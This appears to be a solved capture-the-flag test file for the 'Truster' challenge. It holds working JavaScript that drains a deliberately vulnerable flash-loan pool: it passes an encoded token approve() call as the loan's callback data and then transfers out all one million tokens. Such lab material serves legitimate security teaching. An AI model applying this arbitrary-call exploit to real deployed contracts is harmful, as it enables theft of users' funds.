const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // const TrusterExploit = await ethers.getContractFactory(
    //   "TrusterExploit",
    //   attacker
    // );
    // this.exploit = await TrusterExploit.deploy();
    // await this.exploit
    //   .connect(attacker)
    //   .attack(this.pool.address, this.token.address);
    //alternative below with no separate contract//
    console.log("attacker address is: ", attacker.address);
    const iface = new ethers.utils.Interface([
      "function approve(address spender, uint256 amount)",
    ]);
    const data = iface.encodeFunctionData("approve", [
      attacker.address.toString(),
      TOKENS_IN_POOL,
    ]);
    await this.pool
      .connect(attacker)
      .flashLoan(0, attacker, this.token.address, data);
    await this.token
      .connect(attacker)
      .transferFrom(this.pool.address, attacker, TOKENS_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // this.exploit = await TrusterExploit.new({ from: attacker });
    // await this.exploit.attack(this.pool.address, this.token.address, {
    //   from: attacker,
    // });
    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
